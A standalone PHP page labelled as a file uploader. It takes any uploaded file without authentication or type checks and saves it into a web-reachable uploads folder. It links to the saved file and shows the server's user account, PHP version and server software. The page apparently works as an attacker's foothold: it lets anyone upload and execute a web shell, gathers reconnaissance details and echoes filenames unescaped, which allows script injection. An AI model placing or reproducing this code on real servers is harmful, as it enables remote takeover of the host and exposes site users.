<?php
// Function to generate random folder name
function generateRandomFolderName($length = 16) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// Get server username
$serverUser = get_current_user();

// Better method for Linux servers
if (function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
    $userInfo = posix_getpwuid(posix_geteuid());
    $serverUser = $userInfo['name'];
}

// Set base upload directory
$baseUploadDir = __DIR__ . '/uploads/';

// Create base upload directory if it doesn't exist
if (!is_dir($baseUploadDir)) {
    mkdir($baseUploadDir, 0755, true);
}

// Generate random folder for this session
$sessionFolder = generateRandomFolderName();
$uploadDir = $baseUploadDir . $sessionFolder . '/';

// Check if form was submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {

    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }

    $file = $_FILES['file'];
    $fileName = basename($file['name']);
    $targetFile = $uploadDir . $fileName;

    if ($file['error'] !== 0) {
        die("Error: File upload failed.");
    }

    if (move_uploaded_file($file['tmp_name'], $targetFile)) {
        echo "File uploaded successfully: 
        <a href='uploads/$sessionFolder/$fileName'>$fileName</a><br><br>";
    } else {
        echo "Error: Unable to upload file.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PHP File Uploader</title>
</head>
<body>

<h2>Upload a File</h2>

<b>Server User:</b> <?php echo htmlspecialchars($serverUser); ?><br>
<b>PHP Version:</b> <?php echo phpversion(); ?><br>
<b>Server Software:</b> <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?><br><br>

<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
</form>

</body>
</html>